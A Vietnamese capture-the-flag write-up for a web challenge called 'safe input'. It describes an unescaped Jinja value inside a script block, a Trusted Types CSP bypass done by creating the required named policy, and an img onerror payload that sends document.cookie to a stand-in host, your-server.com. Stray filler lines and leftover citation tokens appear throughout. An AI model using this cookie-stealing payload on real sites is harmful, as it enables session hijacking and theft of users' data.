# `safe input`
## Soluion
### 1. Khám phá lỗ hổng

Khi đọc file app.py của challenge, ta thấy:

- Hàm access_page(text, cookie) sẽ khởi tạo một trình duyệt WebDriver (Selenium) và set cookie với tên "flag" và giá trị FLAG. 
moooooji

- Sau đó nó truy cập URL /test?text={quote(text)} với tham số text do người dùng nhập. 
moooooji

- Trong template test.html, phần quan trọng là:
```html

<script>
  const contentElement = document.getElementById('content');
  const safeInput = "Test: " + `{{test|safe}}`;
</script>
``` :contentReference[oaicite:4]{index=4}  
```

- Dòng {{test|safe}} cho thấy filter safe được dùng — tức là input người dùng không bị escape trước khi chèn vào template. → Đây là lỗ hổng XSS (Cross-Site Scripting).

- Ngoài ra, phía header có thiết lập CSP:
```
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types 16007a93f75cde3710032976adfbcbab;
``` :contentReference[oaicite:5]{index=5}  
```
→ nghĩa là chỉ các script tạo bằng Trusted Types policy với tên `16007a93f75cde3710032976adfbcbab` mới được phép.

### 2. Mục tiêu exploit

- Mục tiêu là chiếm cookie `“flag”` của bot Selenium: vì khi người dùng gửi form `/report`, server sẽ gọi `access_page(text, cookie={"name":"flag","value":FLAG})` và mở trang `/test?text=…`.
moooooji

- Nếu bạn có thể chạy JavaScript trong trang đó, bạn có thể đọc `document.cookie` (mà trong đó có flag) và gửi về server của mình.

### 3. Payload và cách chạy

- Vì CSP bắt buộc `Trusted Types policy` tên `16007a93f75cde3710032976adfbcbab`, bạn cần tạo policy đó trong payload:
```js
let p = trustedTypes.createPolicy(
  "16007a93f75cde3710032976adfbcbab",
  { createHTML: x => x }
);
contentElement.innerHTML = p.createHTML(safeInput + YOUR_PAYLOAD);
```

- Ví dụ payload để gửi cookie về server của bạn:
```js

<img src=x onerror=fetch('https://your-server.com/?c='+document.cookie)>

```

- Kết hợp lại, tham số text bạn gửi có thể như:
```arduino

/report (POST) với text = 
a`+"<img src=x onerror=fetch('https://your-server.com/?c='+document.cookie)>";let p=trustedTypes.createPolicy("16007a93f75cde3710032976adfbcbab",{createHTML:x=>x});contentElement.innerHTML=p.createHTML(safeInput);//
``` 


- Khi bot mở trang `/test?text=…`, `payload` sẽ chạy, gửi cookie chứa `flag` về your-server.com, bạn thu được flag.